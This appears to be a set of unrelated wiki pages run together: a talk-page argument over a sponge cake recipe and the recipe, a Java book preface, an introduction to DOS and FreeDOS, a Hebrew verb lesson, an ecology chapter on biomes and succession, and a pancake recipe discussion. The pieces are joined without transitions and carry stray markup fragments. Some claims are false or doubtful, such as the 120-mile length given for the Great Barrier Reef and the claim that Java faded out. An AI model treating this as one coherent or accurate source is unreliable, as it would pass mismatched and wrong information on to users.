I understand that the recipe is intended to be scalable. Besides being complicated and probably not needed, the procedure doesn't work.

First of all, the [[Cookbook:Baking Soda]] or [[Cookbook:Baking Powder]] '''(Very different! Which one?)''' is not scaled. If scaling is so important, this is a problem.

:On second thought, it doesn't matter. This ingredient is unused. Perhaps the original recipe used normal flour?

The second is the matter of the eggs. If the eggs have lost weight and you do not add water to restore them, you will be using eggs that are thicker than normal. Your instructions handle eggs that have lost content via a leak, not via evaporation.

You say that the recipe is 140+ years old. This might be older than the stanardization of egg weights. The ''USDA Large'' egg is about the same size as an ''EU size M'' egg. I presume this is what you mean. Since these are the default sizes AFAIK, it would have been better to leave the size unspecified. Relying on standard weights will let you be accurate to plus-or-minus 6% or so, which is good enough for every recipe I've ever used.

Regarding kitchen scales, you are clearly unaware of world-wide cooking issues. I have never heard of a US household having such an item. The normal US household has only a crude bathroom scale for measuring human weight. I would not be able to purchase a kitchen scale at any normal place (supermarket) for buying kitchen items. I'd have to drive a long way to a specialty cooking store. I'd probably have to pay $30. Nobody normal would ever do that. Most people in the US are unfamiliar with weighing anything not measured in whole pounds, which would make for a truly huge cake.

Fortunately, the recipe can be fixed based on normal density of the various ingredients.</text>

Sponge cake is the most commonly recognised variety of [[Cookbook:Baking|baked]] confectionery in Britain. It has a sweet taste, often flavoured with [[Cookbook:Vanilla|vanilla]], [[Cookbook:Chocolate|chocolate]] or other additions. It can be cut and displayed in a very large number of different ways.

A [[Cookbook:Impossible Sponge Cake|more difficult version of this recipe]] is available
for those having a kitchen scale and wanting to use it.

==Ingredients==
===For the cake===
* 2 eggs
* 1 Cup minus 2 Tablespoon Self-Rising Flour
* 1/2 cup superfine sugar
* 1/2 cup butter
* 2 mounded Tablespoon baking soda (unused, but you supposedly need it)

If your eggs seem kind of big, you might want to increase the amounts of some ingredients. Add an extra teaspoon each of sugar and butter, and two extra teaspoons of flour. Also, note the adjustments below based on usage of optional ingredients.

====Extras (Optional)====
* [[Cookbook:Vanilla|vanilla]] extract (1-2 [[Cookbook:Teaspoon|t]])
* food coloring (according to looks)
* [[Cookbook:Cocoa Powder|cocoa powder]] (according to taste. Use 3 parts less flour for every 4 parts added.)

===For the filling===
Choose one of these to spread between two cakes if making a cake with more than two eggs.
* 2 to 4 T jelly (softened with pallette knife or similar) or
* Buttercream (cream together 1/2 [[Cookbook:Cup|c]] superfine sugar and 1/2 c butter)
===For dredging===
* 1/3 cup sugar, any type

==Procedure==
#Preheat an oven to [[Cookbook:Oven_temperatures|400°F]].
#Cream together the sugar and butter in the mixing bowl. They should achieve a creamy texture with quite a thick consistency. The longer, harder and faster the butter and sugar are creamed the lighter the cake will be when cooked.
#Add both eggs and mix well.
#Add all the flour and mix well.
#Add any food coloring, flavoring etc. at this point. If you add liquid ingredients, add the same volume again of sugar-and-flour mix to compensate. If adding dry ingredients, ensure to use 3 parts less flour for every 4 parts of extra ingredient added.
#Beat with wooden spoon in a circular motion, trying to incorporate as much air as possible.
#Grease one or two cake pan(s) with butter. You may wish to use a [[Cookbook:Springform Pan|springform pan]] for this recipe.
#Spoon, then scrape, as much cake mixture as possible into the pan(s). If using two pans, try to ensure that both tins have an equal amount of cake mixture in them and that both are not more than 3/4 filled.
#Put the cake tins into the oven and leave them for approximately 10 minutes before checking them. The cooking time should eventually reach around 15 minutes: keep checking them regularly after about 8 minutes since ovens vary.
#Turn the cake out onto a wire rack to cool.
#If doing two layers, turn one of them upside down and spread your filling onto its base, then stick the other cake (top up) onto the upside-down cake.
#Dredge the cake with sugar using a spoon.

      <text xml:space="preserve">Simply put, kitchen scales are not found in the USA. So it isn't just a problem of using metric stuff. Conversion requires calculations involving density. So, here goes.

Would it not be easier to only put 2 lists of ingredients on the other page? Not 2 recipies.



What sort of fail spongecake is this?! Nothing about separating the eggs, beating until extremely light and airy, and then gentle folding in. Looks to me like someone's grandma wrote 'sponge' on top of a poundcake recipe and it was copied into here verbatim.

With lessons learnt from C and C++, Java emerged as a language of choice for the Internet programmer in it's early days circa 1995. Many a programmers adopted this ''easy-to-use'' language almost instantly after its launch and why wouldn't they when it offered all the goodies in one bag: Automatic Garbage Collection, Graphics, Animation, Graphical User Interfaces, Platform Independence, Networking, Internationalisation and Documentation.

__TOC__

== All that hype: Rise and fall of Java ==
The year 1996 saw Java develop a massive following as Usenet groups flooded with vast amounts of news and information about the language. The Java beta and 1.0 might have caused a huge noise in the development community, but it was the version 1.1 launch in March 1997 that led people into thinking &quot;Can Java replace Windows?&quot;&lt;sup&gt;[[Javafied/Preface#References|1]]&lt;/sup&gt;.

People began measuring Java up against systems like Microsoft Windows and no matter how impressive Java seemed, people began scratching up tidbits against the language. Some said it was slow, some simply disliked it because the &lt;code&gt;drawLine(...)&lt;/code&gt; method in the &lt;code&gt;Graphics&lt;/code&gt; class drew a line that was of &lt;code&gt;1px&lt;/code&gt; width. And soon technical papers began appearing on websites benchmarking Java speeds and issues related to performance hits and glitches in Java programs. Java faded out.

== The resurrection ==
With Java out of the scene, software vendors like Microsoft adopted almost all of the functionalities of Java (the Virtual Machine Bytecode, Garbage collection and Multithreading), plastered it over their existing products namely Visual C++ and Visual Basic to come out with a new language, C# and a brand new platform, .Net. Java was long forgotten. C# was now the language of choice for a programmer, a language with the same functionality as that of Java and the speed of C/C++. C# ruled over Java in all aspects.

Java started losing developers, heck, I was one of them. But then the minor version incremented. The &lt;code&gt;1.3&lt;/code&gt; was now &lt;code&gt;1.4&lt;/code&gt;. Hope appeared at the horizon of neglect as streaks of bright red at sunrise would. The Java language was not dead yet! Still in beta it clambered, resurrected but to vain. C# development had juiced out half of developers once devoted Javaholics. A few months later Java incremented to &lt;code&gt;1.5&lt;/code&gt;, but this time Java had some major changes introduced into the language syntax to match some constructs like &lt;code&gt;enum&lt;/code&gt; and the &lt;code&gt;foreach&lt;/code&gt; loop equivalent common to C#. Java attracted a few more developers but it had yet to convince the end-users. Can it?

We'll be exploring how Java can be useful for developers and users both on the Windows platform in this book and will travel deep into the world of Java to learn what's new in Java.

== Support ==
It doesn't just end with this book. We will try to provide ongoing support to readers of this book and keep on improving the text of the book through the '''discussion''' link on the top of each and every page of this book.

We would also be:
*providing a ''download section'' where the source-code (if any) could be downloaded.
*publishing FAQs on using this guide to overcome most of your problems.

== Talkback ==
What makes an author more merrier than response? We welcome comments to the manuscript and would like to hear from all the readers of the book. If you'd like to talk to any of the authors of the book, go ahead and do so using the '''discussion''' link on top of the page.

Please let us know if there are any errors in this book, lest correct them yourself and provide us with your suggestions fro future editions.

== Introduction: what is a DOS? ==
'''DOS''', which stands for '''Disk Operating System''', is an OS that initially loads itself from disk.  The boot PROM contains a trivial OS and a BIOS (basic input/output system) that is sufficient only to achieve that initial load.  (Earlier OSs loaded from paper tape, punched card or magnetic tape.  The first personal computers, such as the Altair did not have an operating system of any kind although they could be added later to use devices.)

In common with most other OSs, Disk Operating Systems consist of four primary modules:
* The extended input/output system which reads and writes to disk and tape, reads from keyboard and writes to screen and/or printer. (Hence the term &quot;read-out&quot; is a Hollywood nonsense neologism for &quot;display&quot;).  Most DOSs are at least minimally open, so that third party developers can write hardware &quot;drivers&quot; (extensions to the I/O system) to support their hardware.  Mac OSs are the most restrictive, Linux the least (fully open). Older Apple DOSs were actually fairly open.
** The Network connection.  (This is just a special case of I/O but occasionally it is useful to treat it separately.)  No early OSs had networking (ignoring the trivial case of attached terminals), but it was added during the 1970 to 1990 period.
* The task scheduler.  Its function is to determine which process should run next and for how long.  In early OSs, this was fairly rudimentary - one task had complete control and if an application crashed, the machine crashed.  '''Interrupts''' were used to give control back to the OS and a different process  takes over.  A &quot;grown up&quot; OS needs '''pre-emptive multi-tasking''', which came to the mainframe world with Exec 8 on Univac hardware in about 1970 and to the personal computer world in 1985 with [[w:AmigaOS|AmigaOS]]. 
* The file (and directory) system
* The User Interface - in early OSs, this is just a  command-line environment.
  
All modern OSs are disk operating systems, but the term &quot;DOS&quot; has stuck to the first generation personal computers that used it.

==Early proprietary DOSs==
Well known DOSs include PC-DOS/MS-DOS (Microsoft), DR-DOS (Digital Research), and FreeDOS. These are all designed to be compatible with MS-DOS. In fact to the average computer user MS-DOS IS DOS. The rest of this section discusses MS-DOS.
The name that Apple gave to DOS for the Apple II was originally DOS 3.1, which went to 3.3, and was then comletely redone for ProDOS.

'''Benefits'''

Today, DOS is commonly used in embedded systems for low royalties, low memory usage, and ease of direct hardware access. DOS remains popular among nostalgists, hobbyists, and in corporate/educational environments where a legacy runtime is needed.  Quite simply, DOS offers compatibility with DOS programs that need total control of the machine.

'''Limitations'''

Foremost, there is no built-in graphical interface for DOS, making it intimidating to beginners. Since DOS is without a default GUI interface, the user must rely on first-party interfaces (Microsoft's DOSSHELL and versions of Windows from 1.03 to 3.12) a non-standard 3rd-party interface or memorize how to type commands to control DOS. It is widely accepted that the command-line environment that DOS provides is inferior to the one provided by UNIX-like systems. DOS systems lack a sophisticated scripting environment, cannot manage memory and CPU usage for multiple processes simultaneously (multitasking), and do not natively support hardware invented since about 1995 - 1998.

== FreeDOS ==
As the name suggests, FreeDOS is a free implementation of the MS-DOS operating system.  The project was started in 1994 when Jim Hall, a student at the University of Wisconsin - River Falls, was discouraged to hear that Microsoft would be moving away from their DOS operating system with the release of Windows 95.

              the Hebrew VERB
               by: Dodi Richter ביד- דודי  ריכטר  

The normal Hebrew verb has a 3-consonant Shoresh שרש, or &quot;root&quot;, which has a vague meaning. Between and around the shoresh are added vowels and other consonants in certain patterns to create new verbs, nouns, and adjectives related to the root in a way determined by the pattern. For example, the root כתב, meaning to write, is added to the pattern פּוֹעֵל, meaning one who does an action, to get כּוֹתֵב, a writer, or one who writes. The root פעל p-'-l &quot;to create, do&quot; is used to indicate the pattern, and the first &quot;פ&quot;, second &quot;ע&quot;, and third &quot;ל&quot; letters of this root are used to symbolize respectively the first, second, and third letters of roots in general.

From the shoresh there can be formed 7 patterns of verb forms, called Binyanim בִּנְיָנִים (Singular: Binyan בִּנְיָן), literally meaning constructions. There are other, rare forms not used in Modern Hebrew.

#Pa'al פָּעַל. This Binyan is the simplest, and is most often called the Kal קל which means &quot;easy&quot; or &quot;light&quot;.
#*Example: &quot;broke&quot; in the sentence: &quot;I broke the window.&quot; &quot;שָׁבַרְתִּי אֵת הַחַלּוֹן&quot;
#Nifal נִפְעַל. This is the passive form of the Pa'al.
#*Example: &quot;is broken&quot; in the sentence &quot;The window is broken.&quot; &quot;הַחַלּוֹן נִשְׁבַּר&quot;
#Pi'el פִּעֵל. This is the more intense form of the verb, indicated by the dagesh in the second letter of the root which shows that it should be pronounced twice as long, &quot;פִע-עֵל&quot;, though this is usually ignored in Modern Hebrew. Sometimes the Pi'el shows a causative.
#*Example: &quot;shattered&quot; in the sentence: &quot;I shattered the window&quot; &quot;שִׁבַּרְתִּי אֶת הַחַלּוֹן&quot;
#*Example of causative: &quot;He learnt&quot; &quot;לָמַד&quot; (Qal) vs. &quot;he taught&quot; &quot;לִמֵּד&quot;.
#Pu'al פֻּעַל. This is the passive form of the Pi'el, also with a dagesh in the second letter of the root.
#*Example: &quot;was shattered&quot; in the sentence: &quot;The window was shattered.&quot; &quot;הַחַלּוֹן שֻׁבַּר&quot;
#*Example of causative: &quot;He was taught&quot; &quot;לֻמַּד&quot;.
#Hif'il הִפְעִיל. This is the causative form of the verb.
#*Example: &quot;reminded&quot; in the sentence: &quot;I reminded him (I caused him to remember).&quot; &quot;הִזְכַּרְתִּי אוֹתוֹ&quot; (The Pa'al of the verb, &quot;זָכוֹר&quot;, means &quot;to remember&quot; or &quot;זָכַר&quot; &quot;he remembered.&quot;)
#Hof'al הָפְעַל or Huf'al הֻפְעַל. This is the passive of the Hif'il.
#*Example: &quot;was reminded&quot; in the sentence: &quot;He was reminded.&quot; &quot;הֻזְכַּר&quot;
#Hitpa'el הִתְפַעֵל. This is the reflexive form of the verb, in which the subject acts on itself.
#*Example: &quot;strolled&quot; in the sentence: &quot;He strolled.&quot; (The Pa'al of the verb, &quot;הָלוֹך&quot;, means &quot;to walk&quot;, &quot;הָלַך&quot; &quot;he walked&quot;; therefore the Hitpa'el has the sense of &quot;he walked himself&quot;, or &quot;he strolled&quot;.)

The consonants of the Shoresh determines the &quot;type&quot; of verb it is, of which there are three principal ones in Hebrew: Strong, Weak and Hollow.

Usually, a verb should be of the Strong type and conform to the general rules of adding and changing vowels and consonants according to Binyan, tense, person, number, and gender. However, some letters can cause a verb not to be Strong, because these rules cannot be applied to these letters, or because these letters can sometimes be dropped.

Weak verbs have such letters as the first or third letter of the Shoresh. There are seven letters that make a verb Weak. These are as follows: א  'alef, ע 'ayin, ה heh, ח chet, י yod, ו vav and נ nun.  

Hollow verbs are verbs in which the SECOND root letter is a ו vav or a י yod.  These disappear in conjugation. The Shoresh  for &quot;to habitate&quot; (temporarily) is גור, and when conjugated becomes (in the Pa'al Binyan, present tense, גר (masculine singular), גרה (feminine sing.), גרים (masc. plural), גרות (fem. plur.). The ו is dropped.

The Hebrew verb also has a Gizarh, or Sound Class.

&lt;big&gt;&lt;big&gt;Chapter 4. The Biological Communities&lt;/big&gt;&lt;/big&gt;  
&lt;/center&gt;
----

A '''''community''''' or '''''biocoenosis''''' is ''an assemblage of organisms (species populations) whose composition and aspect is determined by the properties of the environment and by the relations of the organisms to each other'' (modified from Braatne, 2005). Möbius proposed the term ''biocoenosis'' in 1877 in his study of oyster reefs in the North Sea, recognizing that interactions between species in a structurally complex system brought with it a higher level of functional complexity. Shelford defined a community as an &quot;assemblage with unity of taxonomic composition and a relatively uniform appearance (Odum, 1959).&quot; The ''biotic community'', along with the physical or abiotic elements of the environment together constitute the '''''ecosystem'''''- how a community of organisms interact with their environment of Tansley (1935).

Like an &quot;ecosystem&quot;, the size or area occupied by a community can vary considerably. Bounded by the distribution of the component species populations where these overlap,communities produce a uniform species composition.  Some species might as well be members of other surrounding (or distant) communities. Like the ecosystem concept discussed in [[../Ecosystems|Chapter 5]], the ''community'' concept is broadly defined as one of nested units: conceptually small units potentially being part of containing larger units. This fact is recognized when ecologists define '''major communities''' as those of sufficient size and completeness of organization to be relatively independent of adjoining communities, and '''minor communities''' as those more or less dependent on neighboring (or surrounding) assemblages.

Communities show both functional and structural (taxonomic) unity, although some species may be replaceable over time and space so that functionally similar communities can have different species compositions.  The community concept emphasizes the idea that organisms live together in an orderly manner; that species distributions are more than simply individuals responding in a similar way to a particular set of physical factors. And, of course, a community has properties or characteristics that are more than the sum of its species populations and unique attributes.

==Communities and Biomes==

[[Image:Tree With Moss2.jpg|thumb|350px|left|A single tree could be considered a community]]While the definition of a community can depend on a large number of factors, it can be broken down for easier understanding. In simplest terms, a community is an assemblage of populations living in the same place at the same time, interacting with each other and their environment. According to this definition, there are also various spatial scales that are recognized when describing different types of communities. Spatial scale refers to the size of the organisms that make up the community and can range from very small (i.e., bacteria) to very large (i.e., animals). There are three approaches to spatial ecology: '''Theoretical Ecology''', '''Metapopulation Ecology''', and '''Landscape Ecology''' (Hanski 1998). Every community affects another adjacent community, i.e. communities intergrade continuously. Read [[Wikipedia:en:Metapopulation|Metapopulation]].

Examples of different spatial scales in communities:
* 1. A forest - made up of trees, plants, and animals
* 2. A single tree - made up of a community of insects and flora
* 3. A termite gut - made up of a community of protozoa, bacteria, and archaea

:* Read [[Wikipedia:en:Community_%28ecology%29|Communitiy (Ecology)]].

Emergent properties of communities include stability, response and resilience to invasion and  drought, and bioremediation. (Read [[Wikipedia:en:Bioremediation|Bioremediation]])

===Terrestrial Biomes===

The earth contains many different geographical areas that contain similar climatic conditions. As a result of natural selection, many comparable ecosystems, &quot;biomes&quot;, have developed in these areas. A '''biome''' is a community on a global scale, and is usually defined by temperature, precipitation, and by the types of plants and animals that inhabit it. Generally, biome classification is determined by the climate and geography of an area. Each biome consists of communities that have adapted to the different climate and environment inside the biome. Specifically, there are special vegetation adaptations as well as physical and behavioral adaptions made by animals in order to accommodate the environment.
[[Image:Vegas desert.jpg|thumb|left|A desert biome near Las Vegas, Nevada]]
Several biomes have been identified and include '''tropical forest''', '''temperate forest''', '''taiga''', '''grassland''', '''chaparral''', '''desert''', '''tundra''', and '''aquatic''' environments. '''Tropical forests''' are characterized by high precipitation (around 75-200 cm of rainfall a year) and high temperatures. In contrast, the coniferous forests of the '''taigas''' get just 30-84 cm of precipitation per year and are exposed to average temperatures of -60 Celsius degrees in the winter. '''Chaparrals''' also play host to extreme temperatures and low precipitation (15-40 cm of per year) while '''grasslands''' average 25-70 cm of rain per year and have temperatures similar to those of temperate forest and deserts. '''Deserts''' and '''tundras''' are both very dry biomes (less than 30 cm of precipitation per year), but differ widely in their average temperature ranges. While there are clearly a wide variety of biomes on Earth, they are not all equally represented in terms of land mass.[[image:Taiga_of_Far_East_near_Imeni_Poliny_Osipenko_village,_Khabarovsk_Krai.jpg|thumb|right|A photo from the Siberian taiga north of Khabarovsk.]]

'''Taigas''' are the largest terrestrial biome covering the Earth's surface. Located in the Northern Hemisphere, just below the tundras, they cover 11% of the land mass in the Northern Hemisphere and make up 27% of the Earth's total forest. In fact, the biggest forest in the world is the Siberian taiga.

Conifers that make up '''taigas''' exhibit needles rather than leaves as a specialized adaptation for the taiga biome. The needles have less surface area for better water retention and a wax covering with sunken stomata to help reduce water loss and to protect the conifers from freezing weather. The dark green color of the conifer needles helps absorb energy from the sun to induce photosynthesis for survival. Conifers also display an inverted funnel shape to help shed the enormous amounts of snow load. The long cold winters and the short summers make it hard for plants and animals to survive and the '''taiga''' biome is consequently less diverse than others. The acidic soil of the '''taiga''' regions also affects the vegetation and the animals that feed on those plants.[[image:Taiga.png|thumb|350px|left|Taiga land surface coverage]]

The survival and land mass coverage of the '''taigas''' is threatened by many factors. Since the woody bark of conifer trees is easily burned, fires, natural or man-made, pose a major threat to the '''taigas'''. Also, logging and clear cutting for pasture land diminishes the size of the '''taigas''' in certain areas. The province of Manitoba has signed away 40% of its productive taiga for cutting; an area equal to the size of North Dakota. In addition, Alberta, Canada is allowing massive deforestation in the next sixty years. The loss of a considerable portion of the '''taiga''' is major concern, not only because of the subsequent loss of biodiversity and oxygen production, but also because of the '''&quot;greenhouse effect&quot;'''.  The grasslands are also effected by disturbances. Belcher et al. 1989{{ref|1989}} studied 25 km2 of mixed-grass prairie in Manitoba Canada. The study showed that native prairie was effected by disturbances such as roads, trails, and plowed fireguards. These disturbances expose mineral soil allowing for infestations of leafy spurge which significantly declines the abundance of the dominant native grass species. Leafy spurge poses a threat to potention rangeland, and the conservation of native vegetation.

===Aquatic Communities===

There are three types of aquatic communities that occur in nature: '''marine''', '''freshwater''', and '''estuaries'''.

Marine communities are supported by water of relatively high salinity and are composed of organisms that are able to survive such high-salt conditions. The '''tropical coral reef''' is an example of a marine community that is usually found in shallow, tropical marine waters in latitudes ranging from 30°N to 30°S. On average, the growth of these communities is limited to depths of less than 100 feet and water temperatures greater than 72°F (22°C). These growth limiting factors facilitate the formation of limestone, the major structural component of the reefs. The limestone is secreted by living organisms, including Cnidarians, coralline algae, mollusks, echinoderms, and some annelid worms. Cnidarians are the chief contributor to the limestone formation as they secrete an exoskeleton of calcium carbonate.[[http://en.wikipedia.org/wiki/Reefs#Geologic_reef_definition]] [[Image:Giant_clam_or_Tridacna_gigas.jpg|thumb|right|250px|A giant clam that is part of the Great Barrier Reef]]


There are three basic types of coral reefs: '''Fringing Reef''', '''Barrier Reef''', and '''Atoll'''. '''Fringing Reef''' is continuous with the shore line and is usually exposed during low tide. '''Barrier Reef''' is further away from shore and is usually separated from the shore by a lagoon with an island. The '''Great Barrier Reef''', located off the cost of Australia, is the largest known coral reef. Its width varies between 10 and 90 miles along its 120 mile length. '''Atoll''' is a type of reef that allows some passage out to sea and  surrounds a lagoon that does not have an island.
 
The reefs accommodate organisms of both mobile and non-mobile species. Lobsters, crabs, squid, reef sharks, and many different types of fish and sea cucumbers feed off of the reefs. Different types of algae also inhabit the reefs and serve as a food source for predators.

While the coral reef is an important marine community, many factors are negatively affecting its survival. In fact, as Jackson (1997) points out, coral reef communities have most likely been degraded long before the study of ecology was made relevant in the 1920s. {{note|Jackson}}Today, the hulls and anchors of ships associated with the fishing industry are causing damage to the reefs and high demand from the jewelry industry is decreasing the size of the reefs considerably. Coastal development, water pollution and tourism also pose a threat to the success of the coral reef communities. Jackson proposes the need for large scale reef protection efforts with &quot;extreme&quot; political, economic, and social implications if there is to be any hope of reef conservation.{{note|Jackson}}

[[Image:Barker Dam Lake Reflection.jpg|thumb|left|Barker Dam Lake in California is an example of a freshwater community]]
In contrast to marine communities, freshwater communities are supported by water of relatively low salt concentration and are composed of organisms that would most likely not survive in high salinity conditions. Freshwater communities include rivers, lakes, streams, and ponds.

An [[Wikipedia:en:estuary|estuary]] represents a community that is supported by freshwater and saltwater. Estuaries occupy a coastal location, with an open connection to the sea and some type of freshwater flow (i.e., rivers and streams). Therefore, they are affected by the constraints of both types of environments, creating many small biological niches and accommodating high diversity. [[Image:Moore River Estuary.JPG|thumb|right|An estuary of the Moore River in western Australia]]

Due to the variable nature of the salinity in estuaries, there are many factors that must be taken into account during estuary classification. Circulation patterns, tidal range, freshwater input, dominant habitat types, etc., are all examples of potentials for estuary variation.  Therefore, estuaries are typically classified by regions (i.e. northeastern United States, southeastern United States).  However, as Roman ''et al.'' point out, each estuary is capable of exhibiting unique characteristics due to the complex nature of the geomorphology of a specific area. {{note|roman}}  Even though regional classifications are generally acceptable, it is important to remember that there are always exceptions to the rule. 

==Aquatic Ecosystems==
[[Wikipedia:en:Aquatic_ecosystem|Aquatic ecosystems]] are comprised of two main types: [[Wikipedia:en:Freshwater_biology|freshwater ecosystems]] and [[Wikipedia:en:Marine_ecosystem|marine ecosystems]]. The main driving force of life in these ecosystems is plant growth, from which food chains begin. Plants require four components to grow. They are water, energy in the form of solar radiation (sunlight), inorganic carbon (either carbon dioxide or bicarbonate ions), and minerals/nutrients. Something that we may take for granted is that many of these ecosystems are downstream from humans. However, this fact has not gone unnoticed in the ecosystems. Frissell points out that a number of well monitored species have been detrimentally effected from being downstream of humans. Frissell argues this is due to the fact that we need to view changes to aquatic ecosystems differently than terrestrial ecosystems. Events such as fire and windstorms dramatically effect terrestrial ecosystems, while they have little effect on aquatic systems. At the same time things such as flooding and accelerated erosion are limited in terrestrial ecosystems, but very important in aquatic systems. This is the context in which aquatic ecosystems should be viewed. {{ref|Frissell1996}}

===Freshwater Ecosystems===

The study of freshwater ecosystems is termed [[Wikipedia:en:Limnology|limnology]]. They can be divided into two broad categories: [[Wikipedia:en:Lentic|lentic ecosystems]], which are contained in basins, and [[Wikipedia:en:Lotic_system_ecology|lotic ecosystems]], which are flowing water systems. Glaciers are one cause of lentic environments, where retreating glaciers leave behind basins. The flowing water of lotic systems is responsible for about 6 to 30 times the productivity in [[Wikipedia:en:Primary_producers|primary producers]] compared to primary producers in standing water (Nelson and Scott 1962).

===Saltwater Ecosystems===

Saltwater ecosystem structures are dictated by temperature, salinity, currents, waves, and tides. The most productive areas of the sea are coral reefs and coastal waters. Freshwater rivers eventually empty into the ocean and terrestrial ecosystems meet the edge of the sea. In certain areas, specifically Australia, there have been increases in salinity in freshwater regions. This has been shown to be a major factor driving natrual selection in this region; only the most tolerant organisms are able to survive and reproduce. Unfortunately, it appears that the salinity of these regions will continue to increase. However, the effects of the salinity changes on the ecosystem are unknown and remain to be seen in those areas.{{ref|Nielsen2003}}

== Limnology ==
'''Limnology''' (from Greek: Λίμνη limne, &quot;lake&quot;; and λόγος, logos, &quot;knowledge&quot;) is the study of inland waters (both fresh and saline) and their biological, physical, chemical, geological, and hydrological aspects. This includes the study of natural and man-made lakes, ponds, rivers, streams, wetlands, and groundwaters.  When studying the dynamics of an ecosystem, limnology involves variables such as pH, temperature, depth, and dissolved oxygen profiles of the body of water. Productivity of the system is tested using a transparency test with a Secchi disk, or by analyzing species diversity and abundance.

François-Alphonse Forel (1841-1912) established the field with his studies of Lake Geneva, the largest freshwater lake in Europe. Limnology is closely related to [[Hydrobiology]],the science of underwater life, which applies the principles and methods of physics, chemistry, geology, and geography to ecological problems. Much of modern hydrobiology can be viewed as a sub-discipline of ecology, but the sphere of hydrobiology includes taxonomy, economic biology, industrial biology, morphology, physiology, etc. The study of life in inland waters can be divided into '''lotic''' system ecology (flowing waters) and '''lentic''' system ecology (still waters).

One area of current research is '''eutrophication''', which focuses on biotic interactions in plankton assemblage.  This branch of hydrobiology involves microbial loops, water blooms, phosphorus load, and lake turnover. Another concern of limnology is the acidification of mountain lakes. Long-term studies are being carried out to monitor changes in the ionic composition of river, lake, and reservoir water as a result of acid rain and fertilization. Another goal of current research is the elucidation of the basic environmental functions of the ecosystem in reservoirs, which are important for water quality management and water supply.

[[Image:lambholmquarry.jpg|thumb|left|250px|Fish hatcheries breed fish in a safe environment before releasing them into a lake or river to supplement endangered species or support recreational fishing]]

Many populations of fish are declining in certain habitats due to environmental changes and recreational fishing.  In response, fish hatcheries breed fish in a predator-free, unlimited resource environment before releasing them into a natural habitat, also known as stocking.  A study by Power (1994){{note|pow}}investigated predation by sauger and walleye on paddlefish that were being stocked in Lake Sakakawea.  Predators at three different sites along the lake were sacrificed, and 73% had ingested at least one paddlefish.  All of the ingested paddlefish still intact were only 36-52% of adult size.  These findings suggest that paddlefish are being stocked in the lake before they are large enough to avoid such predation. Another issue with stocking is that the progeny are sometimes genetically inferior to those that are born in a natural habitat.  The downfall to raising fish in such an environment is that there is no competition and no &quot;survival of the fittest.&quot;

Microorganisms have a huge influence on limnology.  They are largely responsible for nitrogen balance in lakes, decomposition of water humus in bogs, annual cycling of iron, and oxidation of sulfur.  Kuznetsov (1968){{note|kuz}}studied this complex cycling by incubating reservoirs and using radioactive isotopes of carbon, nitrogen, iron, and sulfur to monitor what form they were in and at what rate turnover occurred.  Microorganisms establish an elaborate cycle to maintain chemical stability that allows a variety of aquatic life to flourish.

== Succession ==
The concept of '''succession''' was first clearly put forth by Clements (1916). The classical use of the term involves three fundamental concepts (after Mitsch and Gosselink, 1986):
# vegetation occurs in recognizable '''communities''';
# community change through time results from the biota present modifying the environment (changes are '''autogenic''');
# changes are linear and directed towards a '''climax''' ecosystem (Odum, 1971).

Succession is the predictable and orderly changes in the composition or structure of an ecological community.  It's a colonization of a disturbed area that eventually leads to an increase in species diversity.  Succession is divided into two stages- (1) Primary Succession and (2) Secondary Succession.
[[Image:Secondary succesion cm01.jpg|thumb|right|250px|Trees are growing on meadows and fields that are not cultivated anymore]]


'''Primary succession''' deals with the recolonization of bare ground.  The primary succession has '''r-selected organisms'''- species that can survive at high disturbance areas and are fast growing organisms.  There are several factors that can cause disturbance- (1) people, (2) diseases, (3) fire, (4) precipitation/floods, (5) wind/hurricanes/tornadoes, (6) temperature extremes (like freezing or extreme heat), and (7) volcanoes.  In other words, the communities that are in early succession will be dominated by fast-growing, well-dispersed species.  The other stage of succession (as succession moves forward) will be replaced by more competitive species [[Wikipedia:en:Ecological succession/Succession]]. A good example of primary succession is the ecological response to the Mount St. Helens eruption in 1980. Bishop et al. 2005{{ref|Bishop2005}} describes that a primary succession landscape like Mount St. Helens may teach us fundamental mechanisms that describe the formation and function of ecological communities. The use and understanding of these mechanisms may lead to the restoration of devastated landscapes. 

* Read [[Wikipedia:en:Seral community]]

The other stage of succession is '''secondary succession''' which is the recolonization of partially cleared areas (this occurs after primary succession).  Eventually, secondary succession/colonization leads to mature communities called climax communities which are stable communities.  The secondary succession communities have '''k-selected organisms'''-organisms that use the limiting resource the best and therefore can out-compete other individuals  The secondary succession may include a '''seral community'''- an intermediate stage found in ecological succession in an ecosystem that advances towards its climax community.

      <comment>wrong page; that was meant for the 'basic pancakes' page</comment>
      <text xml:space="preserve">I made this recipe, and the mixture seemed awfully thin (I've made pancakes from a mix before). The first one turned out more like a crepe than a pancake; that was probably because I had the heat too low. The next few turned out as pancakes, but very thin and with soft and spongy interiors. About halfway I added more flour to the mixture. The pancakes after that were a nice thickness, but still a bit spongy and tasted a bit off (probably from too much flour).

Any comments? Suggestions? Is the recipe supposed to produce thin pancakes, and what proportions of solid should I add (or liquid should I take out) to make it thicker while still tasting the same? Thanks for any help. --[[User:SPUI|SPUI]] 18:42, 29 Mar 2005 (UTC)

:Oh, just the opposite. This recipe produces very thick pancakes. They often come out about 1/4&quot;, 1 cm, or 3/8&quot; thick. If you do not spread the pancake out well, it can even be 1/2&quot; thick in the middle. Did you use whole wheat flour? (&quot;whole meal&quot; flour in the UK) The batter can thin out if you let it sit for a long time. [[User:AlbertCahalan|AlbertCahalan]] 19:28, 29 Mar 2005 (UTC)

::I used standard white flour - I didn't realize that made much of a difference. Any suggestions for how much white flour to use (and any other adjustments)? --[[User:SPUI|SPUI]] 21:42, 29 Mar 2005 (UTC)

::: In that case, reduce the liquid a bit. Try 3/4 cup. You might start with even less at first, adding more later as needed.

:::Still, &quot;crepe&quot; sounds awfully thin. Might you have used [[Cookbook:Baking Soda|baking soda]] instead of [[Cookbook:Baking Powder|baking powder]]? They are seriously different; if you wish to use baking soda you'd need to add some [[Cookbook:Vinegar|vinegar]] in place of some (1 [[Cookbook:Tablespoon|tablespoon]] maybe) of the milk, or add some powdered acid ([[Cookbook:Cream of Tartar|cream of tartar]] or [[Cookbook:Citric Acid|citric acid]] perhaps). Baking soda won't do anything without acid in the recipe. The pancakes won't puff up right without a leavening agent.

:::If your baking powder is getting a bit old, you could try adding a bit more than called for. This might be the problem if you store your baking powder in a hot and humid place, such as next to the stove.

I just made it with white flour and 1/2 cup milk. I think it came out well; my brother said it was a bit dry but he usually has syrup. --[[User:SPUI|SPUI]] 13:46, 3 Apr 2005 (UTC)

